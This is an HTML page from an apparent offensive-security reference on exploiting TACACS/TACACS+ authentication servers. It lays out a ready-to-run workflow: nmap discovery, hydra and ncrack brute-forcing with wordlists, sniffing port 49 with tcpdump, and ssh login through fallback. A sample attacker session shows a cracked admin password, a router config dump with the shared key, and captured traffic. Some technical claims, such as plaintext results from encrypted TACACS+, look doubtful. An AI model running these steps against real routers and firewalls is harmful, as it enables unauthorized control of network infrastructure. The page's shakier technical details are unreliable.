<!-- Title -->
<h1 class="text-2xl font-bold mb-2">TACACS Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>Network Security</strong> • Focus: <strong>TACACS/TACACS+ AAA Abuse</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    TACACS (and its successor TACACS+) is used for centralized authentication, authorization, 
    and accounting on Cisco and other network devices. TACACS+ runs over TCP/49 and encrypts 
    the entire packet, but older TACACS versions and weak shared secrets can be abused. 
    Attackers target TACACS to brute force credentials, sniff unencrypted TACACS (legacy), 
    replay authentication attempts, or pivot into critical network infrastructure by stealing 
    AAA admin access.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>Weak Shared Secrets:</strong> TACACS+ often uses static, guessable keys.</li>
    <li><strong>Legacy TACACS:</strong> Original TACACS sends data in plaintext.</li>
    <li><strong>Brute Force Attacks:</strong> Usernames/passwords can be cracked with Hydra/Ncrack.</li>
    <li><strong>Misconfiguration:</strong> Some devices accept TACACS fallback without MFA.</li>
    <li><strong>Privilege Escalation:</strong> Compromising TACACS gives control over routers, switches, and firewalls.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Discovery:</strong> Identify TACACS service on TCP/49.</li>
    <li><strong>Brute Force:</strong> Attempt cracking user creds or shared secrets.</li>
    <li><strong>Replay Attacks:</strong> Exploit weak encryption in legacy TACACS.</li>
    <li><strong>Pivot:</strong> Use TACACS admin access to control routers/switches.</li>
    <li><strong>Impact:</strong> Full compromise of AAA infrastructure → domain-wide access.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Scan for TACACS service on TCP/49.</li>
    <li>Attempt brute-force attacks on TACACS+ creds.</li>
    <li>Sniff plaintext TACACS traffic (if legacy version).</li>
    <li>Exploit misconfigurations for unauthorized access.</li>
    <li>Escalate to control network devices via stolen accounts.</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery
# ------------------------------
nmap -p49 -sV [target]                            # Detect TACACS service
nmap --script tacacs-plus-enum [target]           # NSE script if available

# ------------------------------
# Brute Force Credentials
# ------------------------------
hydra -L users.txt -P rockyou.txt -s 49 [target] tacacs
ncrack -p 49 -U users.txt -P passwords.txt [target]

# ------------------------------
# Sniffing Legacy TACACS (plaintext)
# ------------------------------
tcpdump -i eth0 port 49 -vv                       # Capture TACACS traffic
wireshark filter: tcp.port == 49

# ------------------------------
# Exploit Misconfigurations
# ------------------------------
# Some Cisco devices fall back to local creds if TACACS fails
ssh admin@[device]                                # Attempt login after TACACS disruption

# ------------------------------
# Example Workflow
# ------------------------------
nmap -p49 192.168.1.100 -sV
hydra -L users.txt -P rockyou.txt -s 49 192.168.1.100 tacacs
tcpdump -i eth0 port 49
ssh admin@router01
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ nmap -p49 192.168.1.100 -sV
PORT   STATE SERVICE VERSION
49/tcp open  tacacs+ Cisco TACACS+ server

[ saide ~ ]$ hydra -L users.txt -P rockyou.txt -s 49 192.168.1.100 tacacs
[49][tacacs] host: 192.168.1.100   login: admin   password: Summer2025!

[ saide ~ ]$ ssh admin@router01
router01> enable
router01# show running-config
Building configuration...
!
username admin privilege 15 secret 5 $1$QWErty123
tacacs-server host 192.168.1.100 key MySecretKey
!

[ saide ~ ]$ tcpdump -i eth0 port 49
12:05:31.123456 IP 192.168.1.50.35000 > 192.168.1.100.49: TACACS+ authentication request
12:05:31.123789 IP 192.168.1.100.49 > 192.168.1.50.35000: TACACS+ authentication response (ACCEPTED)
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample TACACS exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# Service Discovery
Cisco TACACS+ server running on 192.168.1.100:49

# Brute Force Result
User: admin
Pass: Summer2025!

# Config Dump
Router config file extracted
TACACS key: MySecretKey
AAA settings: privilege 15 user accounts

# Sniffed Traffic (legacy TACACS)
admin login → password: cisco123 (plaintext)

# Proof of Exploitation
Gained privileged access to router/switch/firewall
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-tacacs" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Pentesting TACACS
      </a>
    </li>
    <li>
      <a href="https://www.cisco.com/c/en/us/td/docs/security/asa/asa96/configuration/general/asa-96-general-config/tacacs.html" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        Cisco – TACACS+ Configuration Guide
      </a>
    </li>
    <li>Red Team workflow: Discovery → Brute/sniff → Exploit misconfig → Control infrastructure.</li>
  </ul>
</section>
